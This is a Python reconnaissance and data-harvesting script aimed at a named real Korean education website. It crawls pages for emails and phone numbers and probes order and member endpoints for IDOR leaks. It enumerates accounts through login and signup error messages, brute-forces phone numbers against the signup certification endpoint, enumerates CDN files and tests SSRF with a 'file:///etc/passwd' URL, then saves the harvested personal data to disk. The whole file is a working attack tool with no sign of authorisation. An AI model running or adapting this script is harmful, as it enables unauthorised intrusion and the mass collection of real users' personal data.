#!/usr/bin/env python3
"""us-campus.co.kr deep21 - data leak focused probe"""
import requests, re, json, time, itertools, urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

BASE = "https://us-campus.co.kr"
STATIC = "https://static.us-campus.co.kr"
H = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
OUT = []
HITS = {"emails": [], "phones": [], "pii": [], "files": [], "orders": [], "content": []}

def log(tag, msg):
    line = f"[{tag}] {msg}"
    OUT.append(line)
    print(line, flush=True)

def post(path, data=None, referer=None, session=None):
    hdr = dict(H)
    if referer: hdr["Referer"] = referer
    s = session or requests
    try:
        r = s.post(BASE + path, data=data or {}, headers=hdr, verify=False, timeout=12)
        return r
    except: return None

def get(path, **kw):
    try:
        return requests.get(BASE + path, headers=H, verify=False, timeout=12, **kw)
    except: return None

# ── 1. Crawl all product/campus/master pages for codes & PII ──
log("CRAWL", "=== crawl site pages ===")
pages = set(["/"])
for path in ["/product/academy2026_u", "/study/list", "/board/notice", "/board/faq",
             "/campus/US_CAMP", "/campus/815_CAMP", "/master/MS-001", "/master/park",
             "/notification", "/service/privacy"]:
    r = get(path)
    if not r: continue
    for m in re.findall(r'href=["\'](/[^"\']+)["\']', r.text):
        if any(x in m for x in ["/product/", "/master/", "/campus/", "/study/", "/board/"]):
            pages.add(m.split("?")[0])
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
    phones = re.findall(r'01[016789]-?\d{3,4}-?\d{4}', r.text)
    for e in emails:
        if "amplitude" not in e and e not in [h["email"] for h in HITS["emails"]]:
            HITS["emails"].append({"email": e, "source": path, "type": "page"})
            log("PII-PAGE", f"email {e} from {path}")
    for p in phones:
        log("PII-PAGE", f"phone {p} from {path}")

log("CRAWL", f"found {len(pages)} unique paths")
product_codes = set()
article_codes = set()
for p in list(pages)[:40]:
    r = get(p)
    if not r: continue
    product_codes.update(re.findall(r"productCode['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_]+)['\"]", r.text))
    product_codes.update(re.findall(r"/product/([a-zA-Z0-9_]+)", p))
    article_codes.update(re.findall(r"STUDY\.article\('(\d+)'\)", r.text))
    article_codes.update(re.findall(r"articleCode['\"]?\s*[:=]\s*['\"](\d+)['\"]", r.text))
    article_codes.update(re.findall(r"/study/article/(\d+)", r.text))
log("CRAWL", f"product_codes={product_codes} article_codes={len(article_codes)}")

# ── 2. contentsList all products/menus for data ──
log("CONTENTS", "=== contentsList sweep ===")
menu_ids = list(range(1390, 1420)) + [616, 1, 2, 3, 5, 10, 100]
for code in list(product_codes) + ["FAQ", "academy2026_u", "academy122", ""]:
    for mid in menu_ids:
        r = post("/study/contentsList", {"id": mid, "code": code})
        if r:
            try:
                j = r.json()
                cl = j.get("contentsList", "")
                if cl and len(cl) > 200:
                    arts = re.findall(r"STUDY\.article\('(\d+)'\)", cl)
                    article_codes.update(arts)
                    if arts:
                        log("CONTENTS-HIT", f"id={mid} code={code} articles={arts[:5]} len={len(cl)}")
                        HITS["content"].append({"id": mid, "code": code, "articles": arts, "len": len(cl)})
            except: pass

# ── 3. articleContent / downLoadAttach / preArticle on all codes ──
log("ARTICLE", f"=== test {len(article_codes)} article codes ===")
for ac in list(article_codes)[:50]:
    r = post("/study/articleContent", {"articleCode": ac})
    if r and '"status":"success"' in r.text.replace(" ", ""):
        content = r.json().get("content", "")
        log("ARTICLE-HIT", f"articleContent {ac} len={len(content)} snippet={content[:200]}")
        HITS["content"].append({"type": "articleContent", "code": ac, "len": len(content)})
    r2 = post("/study/downLoadAttach", {"fileId": ac})
    if r2 and '"status":"success"' in r2.text.replace(" ", ""):
        log("FILE-HIT", f"downLoadAttach fileId={ac} -> {r2.text[:300]}")
        HITS["files"].append(json.loads(r2.text))
    r3 = post("/study/preArticleCode", {"articleCode": ac})
    if r3 and '"status":"success"' in r3.text.replace(" ", ""):
        log("ARTICLE", f"preArticle {ac} -> {r3.text[:200]}")
    r4 = post("/study/postArticleCode", {"articleCode": ac})
    if r4 and '"status":"success"' in r4.text.replace(" ", ""):
        log("ARTICLE", f"postArticle {ac} -> {r4.text[:200]}")

# ── 4. Snowflake board notice enumeration ──
log("BOARD", "=== notice snowflake enum ===")
known = [230714171713398527, 240207150523433414, 240417223326931155,
         240812161446947947, 250123122141936364, 260527165058292311]
# scan around known IDs
bases = known + [260326200741235978, 260324202659275136, 260501112500000000]
checked = set()
for base in bases:
    for delta in range(-50, 51):
        nid = str(base + delta)
        if nid in checked: continue
        checked.add(nid)
        r = get(f"/board/notice/{nid}", allow_redirects=False)
        if r and r.status_code == 200 and len(r.text) > 3000:
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
            phones = re.findall(r'01[016789]\d{7,8}', r.text)
            title = re.search(r'<title>([^<]+)', r.text)
            t = title.group(1) if title else ""
            if emails or phones or "비밀" in r.text or "개인" in r.text:
                log("BOARD-PII", f"notice/{nid} title={t} emails={emails} phones={phones}")
                HITS["pii"].append({"type": "notice", "id": nid, "emails": emails, "phones": phones})
            elif len(r.text) > 8000:
                log("BOARD", f"notice/{nid} large page len={len(r.text)}")

# ── 5. Order / member IDOR wide ──
log("IDOR", "=== order/member IDOR ===")
idor_paths = [
    ("/order/detail", ["orderId", "id", "orderNo", "order_id"]),
    ("/order/info", ["orderId", "id"]),
    ("/order/view", ["orderId", "id"]),
    ("/order/getOrder", ["orderId", "id"]),
    ("/order/list", ["page", "limit", "memberId"]),
    ("/member/getMember", ["id", "memberId", "uid"]),
    ("/member/info", ["id", "memberId"]),
    ("/member/detail", ["id", "memberId"]),
    ("/member/profile", ["id", "memberId"]),
    ("/my/orderList", ["page", "limit"]),
    ("/my/orderDetail", ["orderId", "id"]),
    ("/my/payment", ["id"]),
    ("/my/profile", ["id", "memberId"]),
    ("/my/memberInfo", ["id"]),
    ("/notification/list", ["page", "limit"]),
    ("/notification/all", ["page", "limit"]),
    ("/notification/detail", ["id", "notificationId"]),
    ("/study/ajaxComment", ["articleCode"]),
]
for path, params in idor_paths:
    for test_id in ["1", "616", "100", "1000", "260323184412561021"]:
        for p in params:
            r = post(path, {p: test_id})
            if r and r.text.strip():
                t = r.text.strip()
                if '"status":"success"' in t.replace(" ", "") and len(t) > 60:
                    if any(k in t.lower() for k in ["email", "cellphone", "phone", "mobile", "@", "주문", "order", "name"]):
                        log("IDOR-HIT", f"{path} {p}={test_id} -> {t[:350]}")
                        HITS["pii"].append({"endpoint": path, "param": p, "id": test_id, "response": t[:500]})
                    elif "contentsList" in t or "order" in t.lower():
                        log("IDOR", f"{path} {p}={test_id} -> {t[:200]}")

# ── 6. Mass email enum @us-all.co.kr + common KR domains ──
log("ENUM", "=== email mass enum ===")
prefixes = [
    "admin", "dev", "test", "info", "support", "sales", "hr", "ceo", "cto", "cfo",
    "kim", "lee", "park", "choi", "jung", "kang", "yoon", "jang", "lim", "han",
    "sunwoo", "yim", "taehyung", "ansuho", "thkim", "privacy", "helpdesk",
    "marketing", "finance", "campus", "usall", "alliance", "webmaster", "noreply",
    "service", "contact", "manager", "staff", "team", "edu", "academy",
]
domains = ["us-all.co.kr", "us-campus.co.kr", "usall.co.kr"]
found_emails = set()

def check_email(email):
    results = []
    r = post("/login/login", {"email": email, "password": "WrongPass123!"})
    if r:
        try:
            j = r.json()
            msg = j.get("message", "")
            if "비밀번호가 일치" in msg:
                results.append(("password_account", email, msg))
        except: pass
    r2 = post("/member/confirmMail", {"email": email})
    if r2:
        try:
            j = r2.json()
            msg = j.get("message", "")
            if any(x in msg for x in ["GOOGLE", "KAKAO", "메일이 발급", "이미 발급", "이미 발급"]):
                results.append(("confirmMail", email, msg))
            elif "가입하신 이메일" not in msg and j.get("status") == "success":
                results.append(("confirmMail_success", email, msg))
        except: pass
    r3 = post("/member/emailCert", {"email": email})
    if r3:
        try:
            j = r3.json()
            if "이미 가입" in j.get("message", ""):
                results.append(("emailCert_registered", email, j.get("message")))
        except: pass
    return results

candidates = []
for domain in domains:
    for pre in prefixes:
        for variant in [pre, f"{pre}1", f"{pre}2", f"{pre}.kr", f"{pre}admin", f"{pre}_admin"]:
            candidates.append(f"{variant}@{domain}")

# dedupe
candidates = list(dict.fromkeys(candidates))
log("ENUM", f"testing {len(candidates)} emails with thread pool")

with ThreadPoolExecutor(max_workers=8) as ex:
    futs = {ex.submit(check_email, e): e for e in candidates}
    for fut in as_completed(futs):
        for kind, email, msg in fut.result():
            if email not in found_emails:
                found_emails.add(email)
                HITS["emails"].append({"email": email, "type": kind, "message": msg})
                log("ENUM-HIT", f"{kind} {email} -> {msg[:100]}")

# ── 7. Phone enum parallel (fast sample) ──
log("PHONE", "=== phone enum sample ===")
def check_phone(phone):
    s = requests.Session(); s.verify = False
    try:
        s.get(BASE + "/member/join", timeout=8)
        r = s.post(BASE + "/member/cellphoneCert",
                   data={"countryCode": "82", "cellphone": phone},
                   headers={**H, "Referer": BASE + "/member/join"}, timeout=8)
        j = r.json()
        if "이미 회원" in j.get("message", ""):
            return phone
    except: pass
    return None

# targeted prefixes full scan + random samples
phone_prefixes = ["0103456", "0101234", "0102024", "0102025", "0102026",
                  "0101111", "0102222", "0103333", "0104444", "0105555",
                  "0106666", "0107777", "0108888", "0109999"]
phones_to_check = []
for prefix in phone_prefixes:
    for suffix in range(0, 10000, 7):  # step 7 for speed in this probe
        phones_to_check.append(f"{prefix}{suffix:04d}")

with ThreadPoolExecutor(max_workers=12) as ex:
    futs = [ex.submit(check_phone, p) for p in phones_to_check]
    for fut in as_completed(futs):
        hit = fut.result()
        if hit:
            HITS["phones"].append(hit)
            log("PHONE-HIT", hit)

# ── 8. Static CDN file enum with article/product codes ──
log("STATIC", "=== static file enum ===")
static_paths = set()
for code in list(product_codes) + list(article_codes)[:20]:
    for pre in ["", "/vod", "/video", "/attach", "/pdf", "/files", "/upload", "/product"]:
        for ext in [".mp4", ".m3u8", ".pdf", ".zip", ".json"]:
            static_paths.add(f"{pre}/{code}{ext}")
for p in list(static_paths)[:200]:
    try:
        rr = requests.head(STATIC + p, verify=False, timeout=4)
        if rr.status_code == 200:
            log("STATIC-HIT", f"{p} ct={rr.headers.get('content-type')} len={rr.headers.get('content-length')}")
            HITS["files"].append({"path": p, "ct": rr.headers.get("content-type"), "len": rr.headers.get("content-length")})
    except: pass

# ── 9. getSiteVideoPlayer SSRF / URL leak ──
log("VIDEO", "=== getSiteVideoPlayer ===")
test_urls = [
    "https://static.us-campus.co.kr/vod/test.mp4",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "/uploads/test.mp4",
    "file:///etc/passwd",
]
for u in test_urls:
    r = post("/study/getSiteVideoPlayer", {"url": u})
    if r:
        log("VIDEO", f"url={u} -> {r.text[:250]}")

# ── 10. setLikeArticle leak user info ──
for ac in list(article_codes)[:10]:
    r = post("/study/setLikeArticle", {"articleCode": ac})
    if r and len(r.text) > 50:
        log("LIKE", f"setLikeArticle {ac} -> {r.text[:200]}")

# ── 11. Order snowflake around productNo ──
log("ORDER", "=== order ID enum ===")
base_order = 260323184412561021
for delta in range(-20, 21):
    oid = str(base_order + delta)
    r = post("/order/detail", {"orderId": oid})
    if r and '"status":"success"' in r.text.replace(" ", ""):
        log("ORDER-HIT", f"orderId={oid} -> {r.text[:300]}")
        HITS["orders"].append({"orderId": oid, "data": r.text[:500]})
    r2 = get(f"/order/result?orderId={oid}")
    if r2 and len(r2.text) > 5000 and "주문" in r2.text:
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r2.text)
        if emails:
            log("ORDER-PII", f"order/result?orderId={oid} emails={emails}")

# save
summary = {
    "emails": HITS["emails"],
    "phones": HITS["phones"],
    "pii": HITS["pii"],
    "files": HITS["files"],
    "orders": HITS["orders"],
    "content_leaks": HITS["content"],
    "article_codes_count": len(article_codes),
    "article_codes": list(article_codes)[:30],
}
with open("/workspace/us-campus-recon/deep21_data_hits.json", "w") as f:
    json.dump(summary, f, ensure_ascii=False, indent=2)
with open("/workspace/us-campus-recon/deep21_results.txt", "w") as f:
    f.write("\n".join(OUT))

log("DONE", f"emails={len(HITS['emails'])} phones={len(HITS['phones'])} pii={len(HITS['pii'])} files={len(HITS['files'])} content={len(HITS['content'])}")
